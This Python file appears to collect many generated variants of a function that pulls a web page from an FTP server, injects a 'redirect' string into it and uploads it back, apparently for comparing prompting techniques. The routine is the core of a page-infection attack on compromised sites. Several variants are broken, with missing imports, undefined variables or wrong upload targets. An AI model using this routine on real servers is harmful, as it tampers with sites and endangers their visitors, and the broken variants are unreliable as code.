from ftplib import *
import os

def ground_truth_code_injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
  
    f.write(redirect)
    f.close()
  
    with open(page + '.tmp', 'rb') as f:
        ftp.storlines('STOR ' + page, f)

def persona_injectPage(ftp, page, redirect):
    import re
    from ftplib import FTP_TLS
    if not isinstance(ftp, FTP_TLS) or not ftp.sock:
        raise ValueError("Invalid FTP connection")
    page_tmp = page + '.tmp'
    local_file_path = '/tmp/' + re.sub(r'[^\w.]', '_', page_tmp)
    try:
        with open(local_file_path, 'wb') as local_file:
            ftp.retrbinary('RETR ' + page, local_file.write)
        with open(local_file_path, 'a') as local_file:
            local_file.write(redirect)
        with open(local_file_path, 'rb') as local_file:
            ftp.storbinary('STOR ' + page_tmp, local_file)
    finally:
        import os
        try:
            os.remove(local_file_path)
        except OSError:
            pass

def template_injectPage(ftp, page, redirect):
    try:
        import ftplib
        import os
        ftp_conn = ftplib.FTP(ftp['host'])
        ftp_conn.login(ftp['username'], ftp['password'])
        tmp_filename = page + '.tmp'
        with open(tmp_filename, 'wb') as tmp_file:
            ftp_conn.retrbinary(f'RETR {page}', tmp_file.write)
        with open(tmp_filename, 'w') as tmp_file:
            tmp_file.write(redirect)
        with open(tmp_filename, 'rb') as tmp_file:
            ftp_conn.storbinary(f'STOR {page}', tmp_file)
    except ftplib.all_errors as e:
        raise ConnectionError(f"FTP error occurred: {e}")
    except OSError as e:
        raise IOError(f"File operation error: {e}")
    finally:
        try:
            if ftp_conn:
                ftp_conn.quit()
        except NameError:
            pass

def question_refinement_injectPage(ftp_host, ftp_port, username, password, page, redirect):
    if not isinstance(ftp_host, str) or not isinstance(page, str) or not isinstance(redirect, str):
        raise ValueError("Invalid input type.")
    ftp_host = ftp_host.strip()
    page = page.strip()
    redirect = redirect.strip()
    ftps = ftplib.FTP_TLS()
    ftps.ssl_version = ssl.PROTOCOL_TLSv1_2
    try:
        ftps.connect(ftp_host, ftp_port)
        ftps.login(username, password)
        ftps.prot_p()
        file_data = BytesIO()
        ftps.retrbinary(f'RETR {page}', file_data.write)
        file_data.seek(0)
        content = file_data.read().decode('utf-8')
        modified_content = content.replace('<!--INSERT-->', redirect)
        upload_data = BytesIO(modified_content.encode('utf-8'))
        upload_data.seek(0)
        ftps.storbinary(f'STOR {page}', upload_data)
    except ftplib.all_errors as e:
        print(f"FTP error: {e}")
    finally:
        ftps.quit()

def alternative_approaches_injectPage(ftp, page, redirect):
    try:
        content_list = []
        ftp.retrlines('RETR ' + page, content_list.append)
        file_content = '\n'.join(content_list)
        new_filename = page + '.tmp'
    except Exception as e:
        print("Failed to retrieve the file from server:", e)
        return
    try:
        with open(new_filename, 'w') as file:
            file.write(redirect)
            file.write('\n')
            file.write(file_content)
    except IOError as e:
        print("Failed to write to the file:", e)
        return
    try:
        with open(new_filename, 'rb') as file:
            ftp.storbinary('STOR ' + new_filename, file)
    except Exception as e:
        print("Failed to upload the file to server:", e)

def context_manager_injectPage(ftp, page, redirect):
    try:
        ftp.cwd('/')
        with open(page, 'wb') as f:
            ftp.retrbinary(f'RETR {page}', f.write)
        tmp_filename = f'{page}.tmp'
        with open(tmp_filename, 'wb') as tmp_file:
            tmp_file.write(redirect.encode('utf-8'))
        with open(tmp_filename, 'rb') as tmp_file:
            ftp.storbinary(f'STOR {page}', tmp_file)
    except Exception as e:
        raise RuntimeError(f'Failed to inject page: {str(e)}')


def flipped_interaction_3_injectPage(ftp, page, redirect):
    try:
        with open(page, 'wb') as file:
            ftp.retrbinary('RETR ' + page, file.write)
        tmp_filename = page + '.tmp'
        with open(tmp_filename, 'w') as file:
            file.write(redirect)
        with open(tmp_filename, 'rb') as file:
            ftp.storbinary('STOR ' + page, file)
        os.remove(tmp_filename)
        print(f'Successfully updated and uploaded: {page}')
    except ftplib.all_errors as e:
        print(f'FTP error: {e}')
    except Exception as e:
        print(f'An error occurred: {e}')

import ftplib
def flipped_interaction_4_injectPage(ftp, page, redirect):
    temp_page = page + '.tmp'
    ftp.retrbinary(f'RETR {page}', open(temp_page, 'wb').write)
    with open(temp_page, 'w') as file:
        file.write(redirect)
    with open(temp_page, 'rb') as file:
        ftp.storbinary(f'STOR {temp_page}', file)

import ftplib
def flipped_interaction_5_injectPage(ftp, page, redirect):
    try:
        with open(page, 'wb') as local_file:
            ftp.retrbinary('RETR ' + page, local_file.write)
        modified_filename = page + '.tmp'
        with open(modified_filename, 'w') as modified_file:
            modified_file.write(redirect)
        with open(modified_filename, 'rb') as modified_file:
            ftp.storbinary('STOR ' + modified_filename, modified_file)
        ftp.rename(modified_filename, page)
    except ftplib.all_errors as e:
        print(f"FTP error: {e}")

def iterative_prompting_3_inject_page(ftp, page, redirect):
    try:
        if not isinstance(page, str) or not isinstance(redirect, str):
            raise ValueError("'page' and 'redirect' must be strings.")
        if '..' in page or '/' in page or '\\' in page:
            raise ValueError('Invalid page filename: Potential path traversal detected.')
        try:
            with open(page, 'wb') as local_file:
                ftp.retrbinary(f'RETR {page}', local_file.write)
        except error_perm as e:
            raise FileNotFoundError(f"FTP error: {e}")
        except Exception as e:
            raise IOError(f"Error retrieving file from FTP: {e}")
        temp_filename = page + '.tmp'
        try:
            with open(temp_filename, 'wb') as temp_file:
                temp_file.write(redirect.encode())
        except Exception as e:
            raise IOError(f"Error writing to temporary file: {e}")
        try:
            with open(temp_filename, 'rb') as local_file:
                ftp.storbinary(f'STOR {temp_filename}', local_file)
        except error_perm as e:
            raise PermissionError(f"FTP error: {e}")
        except Exception as e:
            raise IOError(f"Error uploading file to FTP: {e}")
        try:
            os.remove(temp_filename)
        except Exception as e:
            print(f"Warning: Temporary file could not be removed: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")

def iterative_prompting_4_inject_page(ftp, page, redirect):
    import os
    from ftplib import error_perm
    if not isinstance(page, str) or not page.strip():
        raise ValueError('Page must be a non-empty string.')
    if not isinstance(redirect, str):
        raise ValueError('Redirect content must be a string.')
    try:
        if not ftp.pwd():
            raise ConnectionError('Not connected to FTP server.')
        page = os.path.basename(page)
        if not page:
            raise ValueError('Invalid file name after sanitization.')
        with open(page, 'wb') as local_file:
            ftp.retrbinary(f'RETR {page}', local_file.write)
        if not os.path.exists(page):
            raise FileNotFoundError(f'Failed to retrieve file: {page}')
        tmp_filename = f'{page}.tmp'
        with open(tmp_filename, 'w') as tmp_file:
            tmp_file.write(redirect)
        with open(tmp_filename, 'rb') as tmp_file:
            ftp.storbinary(f'STOR {tmp_filename}', tmp_file)
        print(f'Successfully uploaded {tmp_filename} to the server.')
    except (error_perm, FileNotFoundError, ConnectionError, OSError, ValueError) as e:
        print(f'An error occurred: {e}')
    except Exception as e:
        print(f'An unexpected error occurred: {e}')
    finally:
        for filename in [page, tmp_filename]:
            try:
                if os.path.exists(filename):
                    os.remove(filename)
            except OSError as e:
                print(f'Error removing file {filename}: {e}')

def iterative_prompting_5_inject_page(ftp, page, redirect):
    if not isinstance(page, str) or not page.strip():
        raise ValueError('Invalid page name specified.')
    if not isinstance(redirect, str):
        raise ValueError('Redirect content must be a string.')
    tmp_filename = page + ".tmp"
    try:
        with open(tmp_filename, "wb") as tmp_file:
            ftp.retrbinary(f"RETR {page}", tmp_file.write)
        with open(tmp_filename, "a") as tmp_file:
            tmp_file.write(redirect)
        with open(tmp_filename, "rb") as tmp_file:
            ftp.storbinary(f"STOR {page}", tmp_file)
    except ftplib.all_errors as e:
        raise Exception(f"FTP error: {e}")
    except IOError as e:
        raise Exception(f"I/O error: {e}")
    finally:
        if os.path.exists(tmp_filename):
            try:
                os.remove(tmp_filename)
            except OSError as e:
                print(f"Cleanup error: {e}")

def few_shots_prompting_injectPage(ftp, page, redirect):
    import os
    import tempfile
    from ftplib import FTP
    with open(page + '.tmp', 'wb') as f:
        ftp.retrbinary(f"RETR {page}", f.write)
    with open(page + '.tmp', 'a') as f:
        f.write(redirect)
    with open(page + '.tmp', 'rb') as f:
        ftp.storbinary(f"STOR {page}", f)
    os.remove(page + '.tmp')

def cot_prompting_injectPage(ftp, page, redirect):
    import os
    from io import BytesIO
    page_content = BytesIO()
    ftp.retrbinary('RETR ' + page, page_content.write)
    page_content.seek(0)
    temp_filename = page + '.tmp'
    with open(temp_filename, 'wb') as temp_file:
        temp_file.write(redirect.encode('utf-8'))
    with open(temp_filename, 'rb') as temp_file:
        ftp.storbinary('STOR ' + page, temp_file)
    os.remove(temp_filename)

def fact_check_list_injectPage(ftp, page, redirect):
    with open(page, 'wb') as temp_file:
        ftp.retrbinary(f"RETR {page}", temp_file.write)
    temp_filename = page + '.tmp'
    with open(temp_filename, 'w') as modified_file:
        modified_file.write(redirect)
    with open(temp_filename, 'rb') as modified_file:
        ftp.storbinary(f"STOR {page}", modified_file)
    os.remove(temp_filename)

def not_interactive_mix_injectPage(ftp, page, redirect):
    import os, tempfile
    from ftplib import FTP
    if not isinstance(page, str) or not isinstance(redirect, str):
        raise ValueError("The 'page' and 'redirect' parameters must be strings.")
    if not page.strip():
        raise ValueError("The 'page' parameter cannot be empty or whitespace.")
    if not redirect.strip():
        raise ValueError("The 'redirect' parameter cannot be empty or whitespace.")
    try:
        with tempfile.NamedTemporaryFile(delete=False) as temp_file:
            ftp.retrbinary(f"RETR {page}", temp_file.write)
            temp_filename = temp_file.name
        temp_new_filename = temp_filename + '.tmp'
        with open(temp_new_filename, 'w', encoding='utf-8') as new_file:
            new_file.write(redirect)
        with open(temp_filename, 'a', encoding='utf-8') as original_file:
            original_file.write(redirect)
        with open(temp_new_filename, 'rb') as upload_file:
            ftp.storbinary(f"STOR {page}", upload_file)
    except Exception as e:
        raise IOError("An error occurred during the FTP file operation.") from e
    finally:
        try:
            os.remove(temp_filename)
            os.remove(temp_new_filename)
        except OSError as cleanup_error:
            print(f"Warning: Failed to remove temporary files: {cleanup_error}")

def interactive_mix_modify_and_upload_ftp(server, username, password, page, redirect):
    import ftplib
    if not all([server, username, password, page, redirect]):
        raise ValueError("All parameters must be provided and cannot be empty.")
    try:
        tls = ftplib.FTP_TLS(server)
        tls.login(user=username, passwd=password)
        tls.prot_p()
        local_file_name = page + '.tmp'
        with open(local_file_name, 'w') as local_file:
            ftp.retrlines(f'RETR {page}', lambda line: local_file.write(line + '\n'))
            local_file.write(redirect)
        with open(local_file_name, 'rb') as local_file:
            ftp.storbinary(f'STOR {local_file_name}', local_file)
    except (ftplib.all_errors, Exception) as e:
        raise Exception(f"FTP error: {e}")
    finally:
        tls.quit()

def baseline_injectPage(ftp, page, redirect):
    try:
        contents = []
        ftp.retrlines(f'RETR {page}', contents.append)
        temp_filename = page + '.tmp'
        with open(temp_filename, 'w') as f:
            f.writelines(contents)
            f.write(redirect)
        with open(temp_filename, 'rb') as f:
            ftp.storbinary(f'STOR {temp_filename}', f)
    except Exception as e:
        print(f'An error occurred: {e}')

